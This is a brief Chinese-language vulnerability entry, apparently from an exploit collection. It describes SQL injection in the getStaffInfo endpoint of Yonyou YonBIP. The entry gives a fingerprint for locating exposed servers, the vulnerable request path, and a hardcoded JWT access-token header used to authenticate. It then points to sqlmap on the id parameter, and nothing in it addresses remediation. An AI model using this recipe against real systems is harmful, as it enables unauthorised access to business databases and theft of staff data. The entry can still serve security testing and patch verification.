# 用友YonBIP高级版getStaffInfo存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="/nccloud/resources/uap/rbac/login/main/index.html"`
- **请求**：`GET /ncchr/attendstaff/getStaffInfo?id=1 HTTP/1.1`
- **关键头**：`accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ`

**请求体 / payload**
```
可sqlmap验证，注入点id=
```